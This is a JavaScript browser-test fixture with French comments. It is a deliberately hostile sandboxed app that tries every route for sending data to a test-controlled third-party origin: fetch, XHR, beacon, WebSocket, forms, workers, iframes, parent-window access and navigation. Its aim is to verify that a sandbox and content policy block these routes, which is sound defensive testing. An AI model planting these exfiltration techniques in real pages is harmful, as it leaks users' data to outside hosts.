// L'application HOSTILE de #341 (ADR 0052) : chaque voie de sortie vers une origine tierce, tentée.
//
// Elle ne lit pas son relevé dans le réseau : c'est l'ORIGINE TIERCE qui compte ce qu'elle reçoit
// (`tests/browser/coquille-sorties-du-cadre.spec.mjs`). Ce document-ci dit seulement ce qu'il a
// TENTÉ, et quelles violations de politique le moteur lui a signalées — un relevé de diagnostic, jamais
// la preuve elle-même : une voie que le moteur fermerait sans le dire resterait fermée, et une voie
// qu'il laisserait passer en le disant resterait ouverte.

import { VOIES_DE_SORTIE, urlDeFuite } from "./sorties-du-cadre.mjs";

/** Le délai laissé aux tentatives asynchrones avant de se dire « tentées ». */
const DELAI_DES_TENTATIVES_MS = 1500;
/** Le délai entre « tentées » et la navigation du cadre, qui détruit ce document si elle aboutit. */
const DELAI_AVANT_NAVIGATION_MS = 1000;

const origineTierce =
  new URL(location.href).searchParams.get("tiers") ??
  document.querySelector('meta[name="origine-tiers"]')?.content;

const rapport = { tentees: [], erreurs: {}, violations: [] };

function publier() {
  document.querySelector("#sorties-rapport").textContent = JSON.stringify(rapport, null, 2);
}

document.addEventListener("securitypolicyviolation", (evenement) => {
  rapport.violations.push({
    directive: evenement.effectiveDirective,
    bloquee: evenement.blockedURI,
  });
  publier();
});

const fuite = (nom, schema) => urlDeFuite(origineTierce, nom, schema);

/** Un parent de MÊME origine que ce document, ou `null` : son royaume est une autre voie. */
function parentDeMemeOrigine() {
  try {
    return parent !== window && parent.document ? parent : null;
  } catch {
    return null;
  }
}

const TENTATIVES = {
  fetch: () => fetch(fuite("fetch"), { mode: "no-cors", method: "POST", body: "clair" }),
  xhr: () => {
    const requete = new XMLHttpRequest();
    requete.open("POST", fuite("xhr"));
    requete.send("clair");
  },
  image: () => {
    const image = document.createElement("img");
    image.src = fuite("image");
    document.body.append(image);
  },
  script: () => {
    const script = document.createElement("script");
    script.src = fuite("script");
    document.body.append(script);
  },
  feuille: () => {
    const lien = document.createElement("link");
    lien.rel = "stylesheet";
    lien.href = fuite("feuille");
    document.head.append(lien);
  },
  formulaire: () => {
    const formulaire = document.createElement("form");
    formulaire.method = "POST";
    formulaire.action = fuite("formulaire");
    formulaire.target = "puits";
    const champ = document.createElement("input");
    champ.name = "clair";
    champ.value = "secret";
    formulaire.append(champ);
    document.body.append(formulaire);
    formulaire.submit();
  },
  websocket: () => new WebSocket(fuite("websocket", "ws:")),
  beacon: () => navigator.sendBeacon(fuite("beacon"), "clair"),
  eventsource: () => new EventSource(fuite("eventsource")),
  cadre: () => {
    const cadre = document.createElement("iframe");
    cadre.src = fuite("cadre");
    document.body.append(cadre);
  },
  worker: () => {
    const source = `fetch(${JSON.stringify(fuite("worker"))}, { mode: "no-cors" });`;
    const url = URL.createObjectURL(new Blob([source], { type: "text/javascript" }));
    new Worker(url);
  },
  // Un cadre `about:blank` HÉRITE de la politique de son créateur : son `fetch` ne doit pas être une
  // porte dérobée.
  "cadre-vierge": () => {
    const vierge = document.createElement("iframe");
    document.body.append(vierge);
    vierge.contentWindow.fetch(fuite("cadre-vierge"), { mode: "no-cors" });
  },
  // Le COURTIER est de même origine (ADR 0038) : son royaume, et son document, sont à portée.
  "parent-fetch": () => parentDeMemeOrigine()?.fetch(fuite("parent-fetch"), { mode: "no-cors" }),
  "parent-image": () => {
    const hote = parentDeMemeOrigine();
    if (!hote) return;
    const image = hote.document.createElement("img");
    image.src = fuite("parent-image");
    hote.document.body.append(image);
  },
  fenetre: () => window.open(fuite("fenetre")),
  "navigation-du-sommet": () => {
    top.location.href = fuite("navigation-du-sommet");
  },
};

const DESTRUCTRICES = new Set(["navigation-du-cadre"]);

for (const { nom } of VOIES_DE_SORTIE) {
  if (DESTRUCTRICES.has(nom)) continue;
  try {
    const promesse = TENTATIVES[nom]();
    promesse?.catch?.((erreur) => {
      rapport.erreurs[nom] = String(erreur?.name ?? erreur);
    });
  } catch (erreur) {
    rapport.erreurs[nom] = String(erreur?.name ?? erreur);
  }
  rapport.tentees.push(nom);
}
publier();

setTimeout(() => {
  document.documentElement.dataset.sorties = "tentees";
  publier();
  // La navigation du cadre DÉTRUIT ce document si elle aboutit : elle vient en dernier, après que le
  // relevé a été posé.
  setTimeout(() => {
    rapport.tentees.push("navigation-du-cadre");
    publier();
    location.href = fuite("navigation-du-cadre");
  }, DELAI_AVANT_NAVIGATION_MS);
}, DELAI_DES_TENTATIVES_MS);
